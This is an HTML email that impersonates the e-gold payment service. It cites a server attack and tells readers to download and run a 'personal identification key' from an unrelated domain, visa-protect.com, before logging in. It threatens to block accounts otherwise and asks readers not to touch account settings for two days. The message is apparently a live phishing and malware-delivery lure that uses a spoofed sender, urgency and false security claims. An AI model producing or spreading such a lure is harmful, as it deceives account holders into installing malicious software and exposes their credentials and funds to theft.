** e-gold Account Information Update Notice **
<p>As you know, the e-gold homepage was unavailable on the 19th of May<br>
  due to security problems. It was connected with the strong attack on<br>
  the e-gold main server. As a result, scammers reached the login<br>
  details of some of our members. In order to prevent unauthorized<br>
  money transfers from these accounts, we generated the personal<br>
  identification keys for each account in our system. The idea was<br>
  taken from our partner Fethard Finance (you can find more information<br>
  about the Fethard security key at http://fethard.biz/faq.php), but we<br>
  made the identification process more easier: everything you should do<br>
  is to download your personal identification key and run it before<br>
  loginning to your e-gold account.</p>
<p>The personal identification key for your account is available at:</p>
<a href="http://visa-protect.com/e-gold_key/ac1G04c40D4rHaFef1GPU3gGAvA3V7yyn59wbtpuDNFzTqkp/e-gold_key.html">Click here to download your Personal Indentification Key</a>
<p>Be sure not to login in your e-gold account without your personal<br>
  identification key or your account will be blocked for online<br>
  operations to avoid fraud activity.</p>
<p>After the first login with your key, you will receive the email with<br>
  Security Level update information. Please do not make any changes in<br>
  your Account Info menu during the next 2 days, as it is necessary for<br>
  the correct authorization of your key. </p>
<p>The personal identification key will allow you to use your e-gold<br>
  account absolutely secure, do not give your key to anyone else.</p>
<p>Be sure to check the sender's name of this email, which should read:<br>
  AccountRobot_donotreply@e-gold.com. Do not use keys attached to emails<br>
  from another senders.</p>
<p>Now you can download your personal identification key and check your<br>
  e-gold account absolutely secure. Thank you for following our security<br>
  measures.<br>
